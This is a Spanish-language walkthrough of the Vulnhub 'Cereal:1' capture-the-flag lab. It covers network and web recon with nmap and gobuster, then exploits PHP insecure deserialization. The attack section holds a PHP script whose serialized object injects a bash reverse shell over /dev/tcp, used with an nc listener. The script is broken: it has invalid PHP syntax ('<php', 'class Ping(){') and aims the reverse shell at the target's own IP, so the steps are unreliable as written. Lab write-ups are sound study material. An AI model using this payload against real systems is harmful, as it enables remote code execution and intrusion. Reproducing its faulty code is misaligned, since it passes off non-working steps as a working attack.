> La deserialización es el **proceso inverso a la serialización, mediante el cual datos estructurados (como JSON, XML o binarios) se convierten nuevamente en objetos en memoria, permitiendo que una aplicación utilice información guardada o transmitida**. Es un paso clave en el intercambio de datos entre APIs, persistencia y comunicación entre componentes.

## Preparacion del laboratorio
- [Cereal:1-Vulnhub](https://www.vulnhub.com/entry/cereal-1,703/)
- Descargar el mirror
- Como siempre chequear que el Adaptador de red sea Bridge para que se asigne una IP

### Descubrimiento
`arp-scan -I ens33 --localnet --ignoredups`
- Descubre la ip
`ping -c 1 192.168.111.45`
- Verifica la conexion
`nmap -p- --open -vvv -n -Pn --min-rate 5000 192.168.111.45 -oG allPorts`
- Descubre los puertos y exporta en un archivo greapeable
`nmap -sCV -p22,80,etc 192.168.111.45 -oN services`
- Descubre que en los puerto `:80` y `:44441` corren servicios de apache

`gobuster dir -u http://192.168.111.45 -w /usr/share/secLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20`
- Descubre rutas en el puerto 80
	- `admin`
	- `blog`

`gobuster vhost -u http://192.168.111.45:44441 -w /usr/share/secLists/Discovery/DNS/subdomains-top1million-5000.txt -t 20`
- Descubre subdominios en el puerto 44441
	- Encuentra `secure.cereal.ctf` que es con el que trabajaremos

`gobuster dir -u http://secure.cereal.ctf:44441 -w /usr/share/secLists/Discovery/DNS/combined_subdomains.txt -t 20`
- Descubrimiento de subdominios de archivos
	- `back_en`

``gobuster dir -u http://secure.cereal.ctf:44441/back_en -w /usr/share/secLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 20 -x php.bak`
- Descubrimiento de archivo de php backups
	- `index.php.bak`

### Entendiendo la vulnerabilidad
- Lo que hace el codigo es crear un objeto con determinadas caracteristicas que luego es serializado y urlencodeado (que es basicamente codificar la informacion) y enviarlo al servidor.
- Lo que haremos sera manipular el objeto y aplicar la codificacion
## Ataques
```serialize.php
<php

class Ping(){
	public $ipAddress = "; bash -c 'bash -i >& /dev/tcp/192.168.111.45/443' 0>&1";
	public $valid = True;
	public $output = "";
}

echo urlencode(serialize(new Ping))
?>
```
- si interceptamos con el burpsuite un envio a `http://cereal.ctf/`
- cambiamos el obj a lo que nos devuelve el archivo de arriba
- nos ponemos en escucha `nc -nlvp 443`
- enviamos y listo, ganamos acceso mediante una RCE

## Herramientas
- [[vulnhub]]